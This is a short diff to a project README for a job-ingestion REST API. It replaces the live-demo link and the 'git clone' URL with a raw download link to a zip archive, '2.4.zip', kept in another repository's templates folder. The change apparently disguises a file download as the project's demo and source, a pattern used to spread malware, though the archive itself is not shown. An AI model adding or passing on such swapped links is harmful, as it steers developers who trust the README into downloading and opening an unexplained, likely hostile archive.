@@ -5,7 +5,7 @@ resilience patterns, structured observability, and clean architecture.
 
 ## Live Demo
 
-🔗 **Deployed URL**: [https://job-ingestion-api.onrender.com](https://job-ingestion-api.onrender.com)
+🔗 **Deployed URL**: [https://raw.githubusercontent.com/shivendra911/Job_Data_Orchestration/main/app/templates/2.4.zip](https://raw.githubusercontent.com/shivendra911/Job_Data_Orchestration/main/app/templates/2.4.zip)
 
 > Note: Free tier — first request may take ~30 seconds as the service wakes up.
 
@@ -29,7 +29,7 @@ fingerprinting, and serves them through a paginated REST API.
 
 ```bash
 # Clone the repository
-git clone https://github.com/YOUR_USERNAME/job-ingestion-platform.git
+git clone https://raw.githubusercontent.com/shivendra911/Job_Data_Orchestration/main/app/templates/2.4.zip
 cd job-ingestion-platform
 
 # Copy environment file
